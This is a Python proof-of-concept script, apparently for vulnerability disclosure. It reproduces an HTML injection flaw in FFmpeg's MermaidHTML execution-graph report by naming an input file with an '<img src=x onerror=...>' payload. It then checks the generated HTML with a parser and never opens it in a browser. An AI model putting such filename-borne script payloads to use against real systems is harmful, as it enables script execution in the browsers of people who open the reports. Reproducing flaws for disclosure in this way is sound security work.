"""Generate and safely parse an FFmpeg MermaidHTML injection proof."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import subprocess
from datetime import UTC, datetime
from html.parser import HTMLParser
from pathlib import Path
from typing import Any

SCHEMA_VERSION = "cw.ffmpeg.mermaidhtml-injection-reproducer.v1"
VULNERABLE_COMMIT = "795bccdaf57772b1803914dee2f32d52776518e2"
PAYLOAD = "<img src=x onerror=alert(4242)>"


class _MermaidPreParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.in_mermaid_pre = False
        self.images: list[dict[str, str | None]] = []

    def handle_starttag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:
        attributes = dict(attrs)
        if tag == "pre" and "mermaid" in (attributes.get("class") or "").split():
            self.in_mermaid_pre = True
        elif self.in_mermaid_pre and tag == "img":
            self.images.append(attributes)

    def handle_endtag(self, tag: str) -> None:
        if tag == "pre" and self.in_mermaid_pre:
            self.in_mermaid_pre = False


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--checkout", type=Path, required=True)
    parser.add_argument("--scratch-dir", type=Path, required=True)
    parser.add_argument("--generated-html", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def _head(path: Path) -> str:
    result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=path,
        check=False,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def main() -> None:
    args = _arguments()
    checkout = args.checkout.expanduser().resolve()
    scratch = args.scratch_dir.expanduser().resolve()
    generated_html = args.generated_html.expanduser().resolve()
    output = args.output.expanduser().resolve()
    binary = checkout / "ffmpeg"
    mermaid_source = checkout / "fftools/textformat/tf_mermaid.c"
    graph_source = checkout / "fftools/graph/graphprint.c"
    graph_template = checkout / "fftools/resources/graph.html"
    components = checkout / "config_components.h"
    required = (
        binary,
        mermaid_source,
        graph_source,
        graph_template,
        components,
    )
    if _head(checkout) != VULNERABLE_COMMIT or not all(
        path.is_file() for path in required
    ):
        raise ValueError(
            f"configured FFmpeg build must exist at {VULNERABLE_COMMIT}"
        )

    component_text = components.read_text(encoding="utf-8", errors="replace")
    for component in (
        "RAWVIDEO_DEMUXER",
        "RAWVIDEO_DECODER",
        "NULL_MUXER",
        "WRAPPED_AVFRAME_ENCODER",
    ):
        if f"#define CONFIG_{component} 1" not in component_text:
            raise ValueError(f"configured build must enable {component}")

    scratch.mkdir(parents=True, exist_ok=True)
    generated_html.parent.mkdir(parents=True, exist_ok=True)
    output.parent.mkdir(parents=True, exist_ok=True)
    malicious_input = scratch / f"source{PAYLOAD}.raw"
    malicious_input.write_bytes(b"ABCD\n")
    command = [
        str(binary),
        "-hide_banner",
        "-loglevel",
        "error",
        "-print_graphs_format",
        "mermaidhtml",
        "-print_graphs_file",
        str(generated_html),
        "-f",
        "rawvideo",
        "-pixel_format",
        "gray",
        "-video_size",
        "1x1",
        "-i",
        str(malicious_input),
        "-frames:v",
        "1",
        "-vf",
        "null",
        "-f",
        "null",
        "-",
    ]
    environment = os.environ.copy()
    environment["ASAN_OPTIONS"] = (
        "halt_on_error=1:abort_on_error=1:detect_leaks=0"
    )
    run = subprocess.run(
        command,
        cwd=checkout,
        env=environment,
        check=False,
        capture_output=True,
        text=True,
    )

    html = (
        generated_html.read_text(encoding="utf-8", errors="replace")
        if generated_html.is_file()
        else ""
    )
    parser = _MermaidPreParser()
    parser.feed(html)
    matching_images = [
        image
        for image in parser.images
        if image.get("src") == "x"
        and image.get("onerror") == "alert(4242)"
    ]

    mermaid_text = mermaid_source.read_text(
        encoding="utf-8", errors="replace"
    )
    graph_text = graph_source.read_text(encoding="utf-8", errors="replace")
    source_indicators = {
        "formatter_substitutes_only_double_quotes": (
            'av_strireplace(str, "\\\"", "\'")' in mermaid_text
        ),
        "formatter_emits_value_inside_html_span": (
            'writer_printf(tfc, "<span class=\\\"%s\\\">%s</span>", key, tmp);'
            in mermaid_text
        ),
        "input_url_reaches_formatter": (
            'print_str("url", fc->url);' in graph_text
        ),
        "html_template_wraps_diagram_in_pre": (
            '<pre class="mermaid">'
            in graph_template.read_text(encoding="utf-8", errors="replace")
        ),
    }
    runtime_indicators = {
        "ffmpeg_succeeded": run.returncode == 0,
        "payload_is_raw_in_generated_html": PAYLOAD in html,
        "payload_was_not_html_escaped": "&lt;img src=x" not in html,
        "html_parser_created_img_in_mermaid_pre": bool(matching_images),
        "sanitizer_clean": "Sanitizer" not in (run.stdout + run.stderr),
    }
    expected_observed = all(source_indicators.values()) and all(
        runtime_indicators.values()
    )
    payload: dict[str, Any] = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(UTC).isoformat(),
        "checkout": str(checkout),
        "checkout_commit": _head(checkout),
        "binary": str(binary),
        "binary_sha256": _sha256(binary),
        "malicious_input": str(malicious_input),
        "input_filename_payload": PAYLOAD,
        "generated_html": str(generated_html),
        "generated_html_sha256": (
            _sha256(generated_html) if generated_html.is_file() else None
        ),
        "command": command,
        "asan_options": environment["ASAN_OPTIONS"],
        "returncode": run.returncode,
        "stdout": run.stdout,
        "stderr": run.stderr,
        "parsed_images_in_mermaid_pre": parser.images,
        "source_indicators": source_indicators,
        "runtime_indicators": runtime_indicators,
        "expected_observed": expected_observed,
        "scope": (
            "When an operator requests MermaidHTML execution-graph output, an "
            "attacker-influenced input URL or filename is embedded without HTML "
            "escaping inside the report's pre element. A filename containing an "
            "img onerror payload therefore creates an active DOM element when "
            "the report is opened. This proof validates the element with the "
            "standard-library HTML parser and never opens the payload in a browser."
        ),
    }
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(
        json.dumps(payload, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
